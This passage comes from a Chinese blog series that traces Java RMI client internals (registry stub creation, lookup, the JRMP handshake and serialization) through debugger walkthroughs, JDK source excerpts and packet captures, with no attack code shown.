class_">StubNotFoundException</span>(</span><br><span class="line">                <span class="string">&quot;object does not implement a remote interface: &quot;</span> +</span><br><span class="line">                implClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();</span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* REMIND: private remote interfaces? */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader,</span><br><span class="line">                                                           interfaces,</span><br><span class="line">                                                           handler);</span><br><span class="line">                &#125;&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i-blog.csdnimg.cn/blog_migrate/442dea619c0643cc0ed79dc8a48ee273.png" alt="在这里插入图片描述"><br>注意到第13行的方法，跟一下看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/13ebee87d6b540073f9077c94d72b8a2.png" alt="在这里插入图片描述"><br><code>getRemoteClass</code>运用了java的放射原理，<br>194行获得了<code>RegistryImpl</code>类实现的所有接口的Class对象，然后遍历这些接口通过调用<code>Remote</code>类Class对象的<code>isAssignagleFrom</code>方法判断Remote是不是这些接口的父类、超接口、或者同一类型。<br>那么到底是不是呢，我们找到了<code>RegistryImpl</code>类：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/cd4bf8099daeb1ff6d8e4ae2aebf853d.png" alt="在这里插入图片描述"><br>发现它集成了<code>RemoteServer</code>类，实现了<code>Register</code>接口<br>而<code>RemoteServer</code>的父类实现了<code>Remote</code>接口，<code>Register</code>接口继承了<code>Remote</code>接口，所以上面的条件是成立的，将会放回lc，也就是<code>Registry</code>类的Class对象，<br><img src="https://i-blog.csdnimg.cn/blog_migrate/646884aa623fa0b36879861937bcd998.png" alt="在这里插入图片描述"><br>调试结果也证实了我们的推断。<br>然后进入一个if判断：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5dd542afad768b13c489070d87531bd3.png" alt="在这里插入图片描述"><br>我们知道<code>forceStubUser</code>是<code>false</code>的，但是调试的结果是计入了该<code>if</code>的判断中，那么后面判断条件就必须是<code>true</code>，我们先看<code>ignoreStubClasses</code><br>这个值是在<code>Util</code>类被加载的时候赋值的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/80023964b8a5ca6514d40400914faa02.png" alt="在这里插入图片描述"><br>跟进<code>booleanValue</code>方法<img src="https://i-blog.csdnimg.cn/blog_migrate/3b9842e3cc2c528b227e430172ac8ca0.png" alt="在这里插入图片描述"><br>发现到了<code>Boolean</code>类，这里返回的是其默认值，我们知道Boolean的默认值为False。<br>那么看第三个参数<code>stubClassExists</code>的返回值必须为<code>true</code>才能满足调试的结果：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/eaedc98b131b660f4c07765bb71af399.png" alt="在这里插入图片描述"><br>影响判断的结果的语句是<br><code>!withoutStubs.containsKey(remoteClass)</code><br>如果为<code>true</code>则返回true，我们知道containsKey方法一般是在集合类型中，判断是否存在指定映射关系，我们看看withoutStubs是否为集合类型：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a60773d7b77631b90800f05a34dc99a3.png" alt="在这里插入图片描述"><br>确实是，那么有没有对应的映射呢？很明显是没有的，那么到这里条件就满足了。注意到了在if里面还通过java的反射机制将<code>RegisterImpl_Stub</code>类加载到了内存中。<br><code>createProxy</code>的if条件满足后，就进入到方法<code>createStub</code>，看着方法名就知道是准备创建一个客户端存根了，不过奇怪的地方来了，昨天不是讲了，客户端存根是在注册中兴创建然后远程加载到客户端的吗？这儿怎么又在客户端创建了？这里我的理解是，在注册中心创建的存根创建后经过序列化，传输到客户端，然后客户端需要有对应类型的对象来接收他，所有这里客户端也会创建一个存根，纯属个人理解不知道对不对。<br><code>createStub</code>这个方法接收了连个参数，一个是<code>remoteClass</code>，也就是<code>RegistryImpl</code>类的Class对象，一个是<code>clientRef</code>这个是什么呢？好像给跟漏了，不着急，我们找一找：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5e2d5a6740f6a4e23b6689ff9dce7c5d.png" alt="在这里插入图片描述"><br>原来<code>createProxy</code>方法的第二个参数就是，也就是刚刚传进来的<code>ref</code>一个单播引用对象<code>UnicastRef</code>继承乐<code>RemoteRef</code><br>跟进<code>createStub</code>方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e372f5b4e9b9d79eb7ea630e0631ee76.png" alt="在这里插入图片描述"><br>首先获取了<code>stubname</code>即<code>RegistryImpl_Stub</code><br>然后291到294行加载了<code>RegistryImpl_Stub</code>类到内存中,并获取了其所有的构造方法，然后调用了其中的一个有参构造方法将<code>ref</code>作为参数传递了进去。<br>这时候得想办法进到<code>RegistryImpl_Stub</code>类里面看看调用了怎样的方法，因为最终放回的<code>Registry</code>会调用lookup方法，我们通过该方法找到对应的实现类：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/00f415e5d43c9694fc309251e82e6534.png" alt="在这里插入图片描述"><br>进入后找到对应的构造方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ac54b1bc4245ba130b0b54b9efb0ad22.png" alt="在这里插入图片描述"><br>使用super调用了父类的构造方法，找到<code>RegistryImpl_Stub</code>的父类：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/1dfaa82c2b8acfcfd4a00c08d88434f9.png" alt="在这里插入图片描述"><br>这绝对是在套娃，没跑了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/76b62e0fef1ab8ea167a0899c47e4032.png" alt="在这里插入图片描述"><br>我草，这啥也没干啊，就赋了个值罢了。不管了，我们继续。<br>所以<code>createStub</code>方法最终返回的是一个<code>RemoteStub</code>对象：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e637c33399b0c63a5b71f07d5d6d306c.png" alt="在这里插入图片描述"></p>
<p>然后<code>createProxy</code>继续将这个对象往上一层抛：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/afc6e7e0dd8154abc68be33a0de6b8cf.png" alt="在这里插入图片描述"><br>最后在<code>getRegistry</code>方法中被强转为<code>Registry</code>类型的对象。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2cbb3d4be5b250b90bbc2c01a4cecfc0.png" alt="在这里插入图片描述"><br>我们知道像下转型才是需要强转的，那么<code>Registry</code>到底是不是<code>RemoteStub</code>类型的子类呢？<br>貌似好像不是的，这个的原理我不太理解，是知识还有欠缺，实际上<code>Registry</code>是一个接口继承了<code>Remote</code>接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/effaacb1129012dcc50601b360a4bf87.png" alt="在这里插入图片描述"><br>而<code>RemoteStub</code>继承了<code>RemoteObject</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/2b2e5aa9c064976943c43abd97560713.png" alt="在这里插入图片描述"><br>而<code>RemoteObject</code>类实现了<code>Remote</code>接口<br><img src="https://i-blog.csdnimg.cn/blog_migrate/2fcbd9f29e84cfb93491b602bc752f31.png" alt="在这里插入图片描述"><br>所以这算什么？<br>这也不是向下转型，而是向上转型，不算一般意义上的强转，当然向上转型也是可以使用强转的。<br>这里的我的理解是<code>RemoteStub</code>向上转型到<code>Remote</code>，因为<code>Registry</code>是扩展了<code>Remote</code>接口的，所以也是可以的。<br>到了这里我们就获得了一个注册器了，到此为止我们仍然没有发现客户端向注册中心发送请求获取存根的代码，为了验证我的推导，我使用难了wireshark抓包，发现确实没有导1099端口的流量：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ae46705e9699401864cf20c96aa27aa9.png" alt="在这里插入图片描述"></p>
<p>那么这部分代码最有可能是存在于lookup的过程中。<br>欲知后事如何，请听下回分说。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>从代码层面看RMI规范的实现与攻击原理（三）</title>
    <url>/archives/b78ab3b1.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%89%EF%BC%89">TOC</a></p>
<p>书接上文，JRMP协议的的握手过程已经结束了，下面就是正式的携带key去注册中心查询是否存在对象了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f491fd63defa7f9645b0bcf86b96af5c.png" alt="在这里插入图片描述"><br>昨天的所有分析都是在1处的代码里面，今天进入到2处<br>首先狐疑到的是118，119行有一个序列化的过程，首先还是获取了一个输出流，然后向里面写了一个对象<code>$param_String_1</code>，当时讲道理这个参数是个字符串，也不是一个对象啊？这是我最开始疑惑的点，但我们要知道在java中<code>String</code>类型就是一个对象并不是一种元类型，其是一种包装类。。<br>然后我们进入到<code>invoke</code>方法里面去：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aabcd8f6377850df6273f5685c1385bb.png" alt="在这里插入图片描述"><br>毫无疑问，try代码块里面的语句是重点，后面都是些异常捕获的语句，我们继续跟进：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/660c3aea8f9ee02f426fa40f9b0ae3b4.png" alt="在这里插入图片描述"><br>看到进入了<code>StreamRemoteCall#executeCall</code><br>首先对<code>out</code>进行判空，这里很明显是不为空的，我们刚刚才往out里写了对象，然后获取了一个<code>DGCAckHandler</code>对象，嗯，我看了里面的代码，这样直接获取的处理器为空，应该会只是想要这么个对象后面调用其中的方法。<br>然后调用<code>releaseOutputStream</code>方法这玩意儿打眼一看就知道是释放输出流的意思，至于具体功能我们还要看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c498017c916e88b689e44015854513e2.png" alt="在这里插入图片描述"><br>首先进行了判空，一样的道理坑定不为空，然后执行<code>out.flush</code>，有了昨天的理论支撑我们很容易知道，只一步执行完之后输出缓冲区的内容讲被发送到注册中心，wireshark抓包查看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8461be7ed4b0e86f3249fc21f3388120.png" alt="在这里插入图片描述"><br>果然，有发送，然后注册中心也有回包。观察到发送的报文以<code>aced0005</code>打头，是序列化没跑了，看到market也包含在里面。<br>然后应该就是处理返回包的过程了。<br>在<code>out.flush</code>执行完毕后，看到又执行了<code>out.done</code>，跟进去看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/a91e3d69bc923f3b36ca5561e8c744bc.png" alt="在这里插入图片描述"><br>首先对<code>dgcAckHandler</code>进行判空，很明显我们刚才获取过，这玩意就是空的，所以里面的代码不会执行，不过看这意思是要开始一个计时器。<br>回到上一层，执行到<code>conn.releaseOutputStream()</code>，跟进去看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8c65541c45e15e2bd2e16a53f1d4060d.png" alt="在这里插入图片描述"><br>这里又flush一次几个意思，不妨执行一下然后看看还有没有数据发送了。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3cb76b3bd1a6e7840fc51714fcca6bbb.png" alt="在这里插入图片描述"><br>发现没有新的数据被发送，所以这里估计是为了确保缓冲区的所有数据都被清空。。<br>然后将<code>out</code>设置为<code>null</code><br>单步向下回到<code>StreamRemoteCall#executeCall</code>第239行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/c77d25df5f97087bbcfcdedc39074e1d.png" alt="在这里插入图片描述"><br>创建输入流咯。。。<br>不过之前我们还是看一下输入长什么样吧：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fa936111a545337626fa373d8f5a931d.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/81515327f8a1b7cf48c4ae15c37aaf52.png" alt="在这里插入图片描述"></p>
<p>也是序列化字符串。<br>然后代码读取一个字节赋值给<code>op</code>，也就是<code>0x51</code>，十进制就是81，然后判断等不等于<code>TransportConstants.Return</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/d9b5450c22355093c7599c7b4a4f05d1.png" alt="在这里插入图片描述"><br>很明显等于。<br>然后又调用了一次本类的获取输入流方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/db1b686461ad7e0fb2e9e19585254ee4.png" alt="在这里插入图片描述"><br>看样子主要还是判断是否存在过滤器，如果存在就调用过滤器进行过滤，上网搜了搜这个过滤器就是为了反序列化过程中的安全性考虑，规定了哪些类可以被反序列化，哪些类不可以。这里没啥用的感觉，反正没有定义过过滤器，所以也就不会被执行。嘴周放回一个空的流，但是在函数执行完毕后也没有变量接收，所以对我们的逻辑没啥影响，不过从这儿也可以看到可以在这儿设置过滤器来避免危险的反序列化操作。<br>回到上一层，再读一个字节的数据。按照调试的结果读出来的数据是1。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/182e6bef6f9f7bc2de4d079086301303.png" alt="在这里插入图片描述"><br>我不李姐<br>。。。<br>原来这个<code>readByte</code>是<code>in</code>的方法，这个in也就是刚才<code>getInputStream</code>赋值的，讲道理这时候获取的输入流连应该啥也没有才对。。。<br>我更不理解了。<br>然后是<code>readID</code>不知道读了个什么神奇的东西。<br>然后进入到<code>switch</code>结构中，根据<code>returnType</code>判断进入哪一个逻辑，我看了一下是进入这一个<br><img src="https://i-blog.csdnimg.cn/blog_migrate/143624325c6d29e5d53fdb6f55cfb667.png" alt="在这里插入图片描述"><br>别问我怎么知道的，问就是调试出来的，<br>这直接break了啊。。。<br>到了这里一直往下单步执行，发现退出了invoke方法，那么接下来应该就是反序列化注册中心发送过来的stub对象了吧。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/36f47cd82c6de1c8ad06791a21335421.png" alt="在这里插入图片描述"><br>果然，首先获取了输入流，然后执行了<code>readObject</code>方法进行发序列化，然后执行<code>ref.done</code>，如果我们猜错现在这一步肯定是要发送挥手包了，然后我一层一层的向里面跟进到了：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9a3a63e3011ba0be67c80407a5b15e59.png" alt="在这里插入图片描述"><br>然后一个一个进去看。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4cf7c9fa99a559f157c80e829b58c7af.png" alt="在这里插入图片描述"><br>这个函数里面有了一些新的数据，看到重点信息是有端口和ip信息。证明源端口或者目标端口要发生变化了，至于到底是源端口还是目标端口我更倾向于源端口，也就是客户端的请求端口未58221，因为此时还没有对注册中心发送回来的数据进行解析调用，那么也就还不知道对象服务器所在的主机以及端口，这里讲道理只能是客户端的端口。</p>
<p>真是草了个大率，，上面一段的反洗完全是在扯犊子。。。。千万不能当真，这个58221端口就是服务器的端口，我裂开了。也就是说在<code>registerRefs</code>方法里面，存根已经被解析了，我草。说来也对，这个方法后面就改返回了，loogup函数就结束了，客户端还没有向服务器发送请求，想想也没有这么简单，这才对嘛。今天就到这里，其他明日在来，也就是客户端向服务器请求远程方法的过程。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>从代码层面看RMI规范的实现与攻击原理（二）</title>
    <url>/archives/fa9410e3.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89">TOC</a></p>
<blockquote>
<p>日常吐槽：这份工作确实无聊，不出活，没进步就是我上班的真实写照，学习进步还是要看下班后。</p>
</blockquote>
<p>上一篇文章我们看了RMI客户端侧代码获取一个注册中心的操作，这一次我们来看看<code>lookup</code>函数是怎么工作的，有不对的地方大佬轻点喷。</p>
<p>在上一篇中我们知道最终获取到的<code>Registry</code>对象是由<code>RegistryImpl_Stub</code>不断转型过来的，那么使用该对象调用<code>lookup</code>函数理论上来说也就是会调用<code>RegistryImpl_Stub</code>中的<code>lookup</code>函数。<br>首先打断点进入到<code>lookup</code>函数：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dbf896f525e005c3f49f93c2c2b39a37.png" alt="在这里插入图片描述"><br>果然是调用的<code>RegistryImpl_Stub</code>中的函数，到这里前期我们有两个点需要关注一是116行，一是123行。<br>首先我们跟进116行的方法，这里调用的是<code>ref</code>对象的newCall，从名字我们大概猜到可能是要发送请求了，首先我们用wireshark过滤一下1099端口，然后让代码执行完116行：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e42dd5107e36f41ed2c10a2d30a4d1e2.png" alt="在这里插入图片描述"><br>标记1处由客户端向注册中心发送请求，发送要使用的JRMI版本号，2处由注册中心向客户端确认版本号，至于第三处也是由客户端发起，具体干了什么我不太清楚（通过后面的分析我发现这一步应该也是类似于TCP三次握手那样的一个确认机制，注册中心返回自己的IP地址，然后客户端提取ip放到这个包里面，最后发送到注册中心，注册中心再对这次请求进行确认）：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bafcbde8f4bf2a190f44ea70dd762b7a.png" alt="在这里插入图片描述"><br>看这意思发送了一个ip地址过去，难道是协商要用哪一张网卡？？？？172这个ip还是我安装wsl的时候生成的一张虚拟网卡。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ea3ac57bee04b54eb242d352b48f3a4a.png" alt="在这里插入图片描述"><br>看名字还是个虚拟以太网交换机？？这我就更迷惑了。。。不过暂时这不重要。<br>那么现在我们就进入到这个<code>newCall</code>方法中看一下都做了什么吧。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c92b01fedcdad85dff58052275cec1a.png" alt="在这里插入图片描述"><br>看到进入了<code>UnicastRef</code>这个类的中，这里注意第343行的代码，首先调用了<code>ref</code>对象的<code>getChannel</code>方法肯定是会返回一个对象的，然后再调用这个对象的<code>newConnection</code>方法，看着名字已经很清楚了这应该就是发送请求的关键函数了。<code>getChannel</code>不出意外是获取一个socket通道，然后<code>newConnection</code>方法发送请求，我们看看对不对，首先进入<code>getChannel</code>方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/71d465617ce4c4548e6106ec95aa4323.png" alt="在这里插入图片描述"><br>看到进入了<code>LiveRef#getChannel</code>，这里大眼一瞧就注意到了第152行。调用了<code>ep</code>对象的<code>getChannel</code>方法，如果还记得上一篇的话，在获取注册中心的时候我们获得过一次<code>TCPEndpoint</code>对象然后赋值给了<code>ep</code>，这里就是了，<code>ep</code>中封装了注册中心的host与port：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d196277e2faec5a89a3d0d5a0b02b98b.png" alt="在这里插入图片描述"><br>进入到<code>getChannel</code>方法：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/144f3de9286eb00c7507604db62c8f74.png" alt="在这里插入图片描述"><br>果然来到了<code>TCPEndpoint</code>类。419行又是函数套函数，不过<code>getOutBoundTransport</code>应该是个类函数，翻译成中文就是获取对外绑定传输，强行翻译了一波。。。。从名字看不出来什么，进到函数里面看看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9a6527244365840d5bfdb548e6b15259.png" alt="在这里插入图片描述"><br>欧，又有，先看<code>getLocalEndpoint</code>函数吧，进去：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                               RMIClientSocketFactory csf,</span></span><br><span class="line"><span class="params">                                               RMIServerSocketFactory ssf)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Find mapping for an endpoint key to the list of local unique</span></span><br><span class="line"><span class="comment">         * endpoints for this client/server socket factory pair (perhaps</span></span><br><span class="line"><span class="comment">         * null) for the specific port.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (localEndpoints) &#123;</span><br><span class="line">            <span class="type">TCPEndpoint</span> <span class="variable">endpointKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="literal">null</span>, port, csf, ssf);</span><br><span class="line">            LinkedList&lt;TCPEndpoint&gt; epList = localEndpoints.get(endpointKey);</span><br><span class="line">            <span class="type">String</span> <span class="variable">localHost</span> <span class="operator">=</span> resampleLocalHost();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (epList == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Create new endpoint list.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                ep = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(localHost, port, csf, ssf);</span><br><span class="line">                epList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TCPEndpoint&gt;();</span><br><span class="line">                epList.add(ep);</span><br><span class="line">                ep.listenPort = port;</span><br><span class="line">                ep.transport = <span class="keyword">new</span> <span class="title class_">TCPTransport</span>(epList);</span><br><span class="line">                localEndpoints.put(endpointKey, epList);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    TCPTransport.tcpLog.log(Log.BRIEF,</span><br><span class="line">                        <span class="string">&quot;created local endpoint for socket factory &quot;</span> + ssf +</span><br><span class="line">                        <span class="string">&quot; on port &quot;</span> + port);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (epList) &#123;</span><br><span class="line">                    ep = epList.getLast();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">lastHost</span> <span class="operator">=</span> ep.host;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">lastPort</span> <span class="operator">=</span>  ep.port;</span><br><span class="line">                    <span class="type">TCPTransport</span> <span class="variable">lastTransport</span> <span class="operator">=</span> ep.transport;</span><br><span class="line">                    <span class="comment">// assert (localHost == null ^ lastHost != null)</span></span><br><span class="line">                    <span class="keyword">if</span> (localHost != <span class="literal">null</span> &amp;&amp; !localHost.equals(lastHost)) &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * Hostname has been updated; add updated endpoint</span></span><br><span class="line"><span class="comment">                         * to list.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">if</span> (lastPort != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             * Remove outdated endpoints only if the</span></span><br><span class="line"><span class="comment">                             * port has already been set on those endpoints.</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            epList.clear();</span><br><span class="line">                        &#125;</span><br><span class="line">                        ep = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(localHost, lastPort, csf, ssf);</span><br><span class="line">                        ep.listenPort = port;</span><br><span class="line">                        ep.transport = lastTransport;</span><br><span class="line">                        epList.add(ep);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ep;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>长的有点过粪了。。。。<br>看到函数中代码是异步执行的，这玩意儿我python中的异步都没咋搞清楚，更别说java了，但不影响我看代码。。。<br>首先new了一个<code>TCPEndpoint</code>类型的endpointkey，暂时不知道干什么的，然后调用了<code>localEndpoint</code>的get方法，看看<code>localEndpoint</code>是什么<br><img src="https://i-blog.csdnimg.cn/blog_migrate/467770a61828fca8946939daf24c16ac.png" alt="在这里插入图片描述"><br><code>Map</code>类型，键为<code>TCPEndpoint</code>类型，值为LinkedList集合类型。所以<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b31e77b96439a904f7ac83f2bce7a856.png" alt="在这里插入图片描述"><br>201就是根据<code>endpointkey</code>从<code>Map</code>中 取值，然后202行调用<code>resampleLocalHost</code>方法对主机名进行重新采样，我猜就是再获取一下对host进行解析，不妨跟进去看一看：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aea1a383e6ae368a46fbd0b5e75f6981.png" alt="在这里插入图片描述"><br>257行获取了一个字符串，看命名应该是从properties中获取hostname，跟进<code>getHostnameProperty</code>函数看一下：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da119bd40e9e12c28d3b358372a8135d.png" alt="在这里插入图片描述"><br>这里有个<code>GetPropertyAction</code>类，上网查了一下粗糙的理解就是获取properties的值，进入函数看了看就是个赋值操作，不知道为甚么网上那样说。<br>最终的结论是<code>resampleLocalHost</code>方法还是返回了注册中心的IP地址，可能因为我这里在本地看不出来区别，分开的话应该就能判断出一些什么了。<br>然后回到<code>getLocalEndpoint</code>方法<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7a3fb0c0f7cbeb075727c3a33b65b2e.png" alt="在这里插入图片描述"><br>又创建了一个<code>TCPEndpoint</code>对象，不过这时候有了主机名了localhost，一个<code>LinkedList</code>把新的<code>ep</code>放进去，然后又设置了一下ep的<code>listenport</code>属性，然后新建一个<code>TCPTransport</code>赋值给了<code>ep</code>的<code>transport</code>，真有趣，一个套一个。。。。最后返回了<code>ep</code>，一个<code>TCPEndpoint</code>对象。<br>然后抛出到<code>getOutboundTransport</code>方法又是这样的：<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d49db9d235e7ceebf6abaecd40dd3cd1.png" alt="在这里插入图片描述"><br>还是要的<code>transport</code>你说有趣不有趣。<br>依次往上抛，最终还是调用的<code>TCPTransport</code>对象的<code>getChannel</code>方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/276f048bb9549fc1de41ac6470cd007d.png" alt="在这里插入图片描述"><br>这个<code>channelTable</code>又是一个<code>Map</code><img src="https://i-blog.csdnimg.cn/blog_migrate/4b358d22fffa2030fdcd91d2c50fd03e.png" alt="在这里插入图片描述"><br>一个端点对应一个TCP通道，很明显，我们还没有建立通道，所以这个表现在肯定是空的，所以在get的时候一是获取了个寂寞。<br>既然表示空的，下面的操作自然就是创建一个通道然后建立映射关系。然后返回这个通道，终于<code>getChannel</code>方法结束了，然后就是建立连接了，也就是调用<code>TCPChannel</code>对象的<code>newConnection</code>方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/22d3992d28378bcfb6ac6dd3fc0b294c.png" alt="在这里插入图片描述"><br>代码挺长的，说白了就是看看是不是已经有了一个连接了，如果有了就直接拿来用，如果没有就新建一个，我们直接进到新建的逻辑里面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">createConnection</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        Connection conn;</span><br><span class="line"></span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;create connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!usingMultiplexer) &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">sock</span> <span class="operator">=</span> ep.newSocket();</span><br><span class="line">            conn = <span class="keyword">new</span> <span class="title class_">TCPConnection</span>(<span class="built_in">this</span>, sock);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(conn.getOutputStream());</span><br><span class="line">                writeTransportHeader(out);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// choose protocol (single op if not reusable socket)</span></span><br><span class="line">                <span class="keyword">if</span> (!conn.isReusable()) &#123;</span><br><span class="line">                    out.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    out.writeByte(TransportConstants.StreamProtocol);</span><br><span class="line">                    out.flush();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Set socket read timeout to configured value for JRMP</span></span><br><span class="line"><span class="comment">                     * connection handshake; this also serves to guard against</span></span><br><span class="line"><span class="comment">                     * non-JRMP servers that do not respond (see 